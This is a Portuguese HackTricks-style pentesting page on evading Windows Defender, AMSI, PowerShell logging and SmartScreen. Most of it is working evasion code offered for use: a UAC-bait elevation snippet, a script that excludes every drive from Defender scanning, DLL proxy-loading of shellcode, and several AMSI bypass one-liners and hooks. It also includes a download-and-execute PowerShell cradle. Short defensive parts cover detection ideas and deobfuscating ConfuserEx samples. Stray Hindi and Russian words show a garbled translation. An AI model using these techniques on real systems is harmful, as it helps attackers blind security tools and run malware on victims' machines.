# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi inicialmente escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir que o Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir que o Windows Defender funcione, simulando outro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo instalador antes de adulterar o Defender

Loaders públicos que se passam por cheats de jogos frequentemente vêm como instaladores Node.js/Nexe não assinados que primeiro **pedem elevação ao usuário** e só depois neutralizam o Defender. O fluxo é simples:

1. Verifique o contexto administrativo com `net session`. O comando só tem sucesso quando o chamador possui privilégios de admin, então uma falha indica que o loader está sendo executado como usuário padrão.
2. Relance-se imediatamente com o verbo `RunAs` para acionar o prompt de consentimento esperado do UAC, preservando a linha de comando original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
As vítimas já acreditam que estão instalando software “cracked”, então o prompt geralmente é aceito, dando ao malware os privilégios de que ele precisa para alterar a política do Defender.

### Exclusões abrangentes de `MpPreference` para cada letra de unidade

Uma vez elevado, cadeias no estilo GachiLoader maximizam os pontos cegos do Defender em vez de desativar o serviço diretamente. O loader primeiro encerra o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e depois aplica **exclusões extremamente amplas** para que todo perfil de usuário, diretório de sistema e disco removível se torne impossível de ser escaneado:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, USB sticks, etc.) então **qualquer payload futuro solto em qualquer lugar no disco é ignorado**.
- A exclusão da extensão `.sys` é voltada para o futuro—atacantes reservam a opção de carregar drivers não assinados mais tarde sem mexer no Defender de novo.
- Todas as alterações ficam em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que estágios posteriores confirmem que as exclusões persistem ou as expandam sem disparar UAC novamente.

Como nenhum serviço do Defender é interrompido, verificações de saúde ingênuas continuam relatando “antivirus active” mesmo que a inspeção em tempo real nunca toque nesses caminhos.

## **AV Evasion Methodology**

Atualmente, AVs usam métodos diferentes para verificar se um arquivo é malicioso ou não, static detection, dynamic analysis, e, para os EDRs mais avançados, behavioural analysis.

### **Static detection**

Static detection é alcançada sinalizando strings ou arrays de bytes maliciosos conhecidos em um binário ou script, e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer você ser pego com mais facilidade, já que elas provavelmente já foram analisadas e sinalizadas como maliciosas. Há algumas maneiras de contornar esse tipo de detecção:

- **Encryption**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas você precisará de algum tipo de loader para descriptografar e executar o programa em memória.

- **Obfuscation**

Às vezes tudo o que você precisa fazer é बदलar algumas strings no seu binário ou script para fazê-lo passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando obfuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas ruins conhecidas, mas isso leva muito tempo e esforço.

> [!TIP]
> Uma boa forma de verificar a static detection do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em vários segmentos e depois faz o Defender escanear cada um individualmente; assim, ele consegue dizer exatamente quais são as strings ou bytes sinalizados no seu binário.

Eu recomendo fortemente que você confira esta [playlist no YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion prática.

### **Dynamic analysis**

Dynamic analysis é quando o AV executa seu binário em um sandbox e observa atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do seu navegador, realizar um minidump no LSASS, etc.). Essa parte pode ser um pouco mais difícil de lidar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Sleep before execution** Dependendo de como isso é implementado, pode ser uma ótima forma de burlar a dynamic analysis do AV. AVs têm um tempo muito curto para escanear arquivos sem interromper o fluxo de trabalho do usuário, então usar sleeps longos pode atrapalhar a análise de binários. O problema é que muitas sandboxes de AV podem simplesmente pular o sleep dependendo de como isso é implementado.
- **Checking machine's resources** Normalmente, sandboxes têm pouquíssimos recursos para trabalhar (por exemplo, < 2GB RAM), caso contrário poderiam deixar a máquina do usuário lenta. Você também pode ser bem criativo aqui, por exemplo verificando a temperatura da CPU ou até a velocidade das ventoinhas, nem tudo será implementado no sandbox.
- **Machine-specific checks** Se você quiser atingir um usuário cujo workstation esteja ingressada no domínio "contoso.local", você pode fazer uma verificação do domínio do computador para ver se ele corresponde ao que você especificou; se não corresponder, você pode fazer seu programa sair.

Acontece que o nome do computador do Sandbox do Microsoft Defender é HAL9TH, então você pode verificar o nome do computador no seu malware antes da detonação; se o nome corresponder a HAL9TH, isso significa que você está dentro do sandbox do Defender, então pode fazer seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas de [@mgeeky](https://twitter.com/mariuszbit) para ir contra Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como já dissemos antes neste post, **public tools** eventualmente **will get detected**, então você deve se perguntar algo:

Por exemplo, se você quer fazer dump do LSASS, **você realmente precisa usar mimikatz**? Ou poderia usar um projeto diferente, menos conhecido e que também faça dump do LSASS.

A resposta certa provavelmente é a segunda. Tomando mimikatz como exemplo, provavelmente é uma das peças de malware mais sinalizadas, se não a mais, por AVs e EDRs; embora o projeto em si seja super cool, também é um pesadelo trabalhar com ele para contornar AVs, então apenas procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evasion, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, sério, **NÃO FAÇA UPLOAD PARA VIRUSTOTAL** se seu objetivo for conseguir evasion no longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evasion**; na minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados, então é um truque bem simples de usar para evitar detecção em alguns casos (se o seu payload tiver alguma forma de rodar como DLL, claro).

Como podemos ver nesta imagem, um DLL Payload do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ficar muito mais stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a DLL search order usada pelo loader posicionando tanto a application vítima quanto os payload(s) maliciosos lado a lado.

Você pode verificar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando irá gerar a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Eu recomendo fortemente que você **explore programas DLL Hijackable/Sideloadable por conta própria**, essa técnica é bem stealthy quando feita corretamente, mas se você usar programas DLL Sideloadable conhecidos publicamente, pode ser pego facilmente.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja carregado, pois o programa espera algumas funções específicas dentro dessa DLL; para corrigir esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um template de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estes são os resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto o nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção de 0/26 em [antiscan.me](https://antiscan.me)! Eu diria que isso é um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista ao [VOD da Twitch do S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos em mais profundidade.

### Abusing Forwarded Exports (ForwardSideLoading)

Módulos PE do Windows podem exportar funções que na verdade são "forwarders": em vez de apontar para código, a entrada de exportação contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um chamador resolve a exportação, o loader do Windows vai:

- Carregar `TargetDll` se ainda não estiver carregada
- Resolver `TargetFunc` a partir dela

Comportamentos-chave para entender:
- Se `TargetDll` for uma KnownDLL, ela é fornecida a partir do namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).
- Se `TargetDll` não for uma KnownDLL, a ordem normal de busca de DLLs é usada, o que inclui o diretório do módulo que está fazendo a resolução do forward.

Isso habilita um primitive indireto de sideloading: encontre uma DLL assinada que exporte uma função encaminhada para um nome de módulo que não seja KnownDLL, então coloque essa DLL assinada junto com uma DLL controlada pelo atacante nomeada exatamente como o módulo de destino encaminhado. Quando a exportação encaminhada for invocada, o loader resolve o forward e carrega sua DLL do mesmo diretório, executando o seu DllMain.

Exemplo observado no Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é um KnownDLL, então ele é resolvido via a ordem normal de busca.

PoC (copiar e colar):
1) Copie a DLL assinada do sistema para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acione o forward com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (signed) carrega a side-by-side `keyiso.dll` (signed)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- O loader então carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você só vai obter um erro de "missing API" depois que `DllMain` já tiver sido executado

Dicas de hunting:
- Foque em forwarded exports em que o módulo de destino não seja um KnownDLL. KnownDLLs estão listadas em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com tooling como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideias de detecção/defesa:
- Monitore LOLBins (por exemplo, rundll32.exe) carregando DLLs assinadas de caminhos não pertencentes ao sistema, seguidas pelo carregamento de non-KnownDLLs com o mesmo nome base a partir desse diretório
- Gere alerta em cadeias de processo/módulo como: `rundll32.exe` → `keyiso.dll` não pertencente ao sistema → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue write+execute em diretórios de aplicação

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de forma stealthy.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, então nunca dependa de apenas uma ferramenta. Se possível, tente encadear múltiplas técnicas de evasion.

## Syscalls Diretos/Indiretos & Resolução de SSN (SysWhispers4)

EDRs frequentemente colocam **hooks inline em user-mode** nos stubs de syscall do `ntdll.dll`. Para contornar esses hooks, você pode gerar stubs de syscall **diretos** ou **indiretos** que carregam o **SSN** correto (System Service Number) e fazem a transição para o kernel mode sem executar o entrypoint exportado hookado.

**Opções de invocação:**
- **Direct (embedded)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (sem atingir o export do `ntdll`).
- **Indirect**: salta para um gadget `syscall` existente dentro do `ntdll`, de modo que a transição ao kernel pareça se originar do `ntdll` (útil para evasion heurística); o **randomized indirect** escolhe um gadget de um pool a cada chamada.
- **Egg-hunt**: evita incorporar a sequência de opcode estática `0F 05` no disco; resolve uma sequência de syscall em runtime.

**Estratégias de resolução de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infere SSNs ordenando os stubs de syscall por virtual address em vez de ler os bytes do stub.
- **SyscallsFromDisk**: faz o mapeamento de um `\KnownDlls\ntdll.dll` limpo, lê os SSNs do seu `.text` e depois faz unmap (contorna todos os hooks em memória).
- **RecycledGate**: combina inferência de SSN por VA sort com validação de opcode quando um stub está limpo; faz fallback para inferência por VA se estiver hookado.
- **HW Breakpoint**: define DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` em runtime, sem fazer parsing de bytes hookados.

Exemplo de uso do SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI foi criada para impedir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de escanear **arquivos em disco**, então, se você conseguisse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedi-los, pois não tinha visibilidade suficiente.

A funcionalidade AMSI está integrada nestes componentes do Windows.

- User Account Control, ou UAC (elevação de EXE, COM, MSI, ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Office VBA macros

Ela permite que soluções antivírus inspecionem o comportamento de scripts expondo o conteúdo dos scripts de uma forma que seja ao mesmo tempo não criptografada e não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` vai produzir o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Note como ele adiciona `amsi:` e depois o caminho para o executável a partir do qual o script foi executado, neste caso, powershell.exe

Não colocamos nenhum arquivo em disco, mas ainda assim fomos pegos na memória por causa do AMSI.

Além disso, начиная com **.NET 4.8**, código C# também é executado através do AMSI. Isso até afeta `Assembly.Load(byte[])` para carregar execução em memória. Por isso, usar versões mais baixas do .NET (como 4.7.2 ou inferiores) é recomendado para execução em memória se você quiser evadir o AMSI.

Há algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir a detecção.

No entanto, o AMSI tem a capacidade de unobfuscate scripts mesmo que eles tenham múltiplas camadas, então a obfuscation pode ser uma má opção dependendo de como for feita. Isso torna a evasão não tão direta. Ainda assim, às vezes tudo o que você precisa fazer é mudar alguns nomes de variáveis e pronto, então depende de quanto algo já foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível adulterá-lo facilmente, mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias formas de evadir a varredura do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhuma varredura seja iniciada para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para impedir o uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi necessário foi uma linha de código do powershell para tornar o AMSI inutilizável para o processo atual do powershell. Essa linha, claro, foi sinalizada pelo próprio AMSI, então é necessária alguma modificação para usar essa técnica.

Aqui está um AMSI bypass modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado assim que este post sair, então você não deve publicar nenhum código se seu plano é permanecer indetectado.

**Memory Patching**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-lo com instruções para retornar o código de E_INVALIDARG; dessa forma, o resultado do scan real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

Também existem muitas outras técnicas usadas para contornar AMSI com powershell, confira [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender mais sobre elas.

### Bloqueando AMSI impedindo o carregamento de amsi.dll (hook LdrLoadDll)

AMSI é inicializado apenas depois que `amsi.dll` é carregado no processo atual. Um bypass robusto e agnóstico de linguagem é colocar um hook em modo usuário em `ntdll!LdrLoadDll` que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhum scan ocorre para esse processo.

Esboço de implementação (pseudocódigo x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona em PowerShell, WScript/CScript e custom loaders alike (qualquer coisa que, de outra forma, carregaria AMSI).
- Combine com o envio de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar longos artefatos na command-line.
- Visto em uso por loaders executados através de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera script para bypass AMSI.
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera script para bypass AMSI que evita signature usando randomized user-defined function, variables, characters expression e aplica random character casing aos PowerShell keywords para evitar signature.

**Remover a signature detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a AMSI signature detectada da memória do processo atual. Esta ferramenta funciona escaneando a memória do processo atual em busca da AMSI signature e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar Powershell version 2**
Se você usar PowerShell version 2, AMSI não será carregado, então você pode executar seus scripts sem ser escaneado pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging é um recurso que permite registrar todos os comandos PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e solução de problemas, mas também pode ser um **problema para attackers que querem evadir detection**.

Para contornar PowerShell logging, você pode usar as seguintes técnicas:

- **Desabilitar PowerShell Transcription e Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse propósito.
- **Usar Powershell version 2**: Se você usar PowerShell version 2, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Usar uma sessão Powershell não gerenciada**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar um powershell sem defenses (isso é o que `powerpick` do Cobal Strike usa).


## Obfuscation

> [!TIP]
> Várias técnicas de obfuscation dependem de criptografar dados, o que aumentará a entropia do binary e facilitará para AVs e EDRs detectá-lo. Tenha cuidado com isso e talvez aplique encryption apenas a seções específicas do seu code que sejam sensíveis ou precisem ser ocultadas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais), é comum enfrentar várias camadas de protection que bloqueiam decompilers e sandboxes. O fluxo abaixo restaura de forma confiável um **IL quase original** que depois pode ser decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Remoção de anti-tampering – ConfuserEx criptografa cada *method body* e a descriptografa dentro do construtor estático do *module* (`<Module>.cctor`). Isso também corrige o checksum do PE, então qualquer modificação fará o binary falhar. Use **AntiTamperKiller** para localizar as tabelas de metadata criptografadas, recuperar as chaves XOR e reescrever uma assembly limpa:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros de anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Recuperação de symbols / control-flow – passe o arquivo *clean* para **de4dot-cex** (um fork de de4dot ciente de ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o profile de ConfuserEx 2
• de4dot vai desfazer o control-flow flattening, restaurar namespaces, classes e nomes de variáveis originais e descriptografar strings constantes.

3.  Remoção de proxy-call – ConfuserEx substitui chamadas diretas de method por wrappers leves (a.k.a *proxy calls*) para dificultar ainda mais a decompilation. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após esta etapa, você deve observar APIs .NET normais como `Convert.FromBase64String` ou `AES.Create()` em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binary resultante no dnSpy, procure por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o *real* payload. Muitas vezes o malware o armazena como um byte array codificado em TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o execution flow **sem** precisar executar a amostra maliciosa – útil ao trabalhar em uma workstation offline.

> 🛈  ConfuserEx produz um custom attribute chamado `ConfusedByAttribute` que pode ser usado como um IOC para triagem automática de samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source do pacote de compilação [LLVM](http://www.llvm.org/) capaz de oferecer maior segurança de software por meio de [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar nenhuma ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates em C++, o que tornará a vida da pessoa que quiser crackear a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar vários tipos diferentes de arquivos pe, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um engine simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas pelo LLVM usando ROP (return-oriented programming). O ROPfuscator ofusca um programa no nível do código assembly, transformando instruções regulares em chains ROP, frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e depois carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações baixadas com pouca frequência acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, junto com a URL de onde ele foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **trusted** **não dispararão o SmartScreen**.

Uma maneira muito eficaz de impedir que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de contêiner, como uma ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **não NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

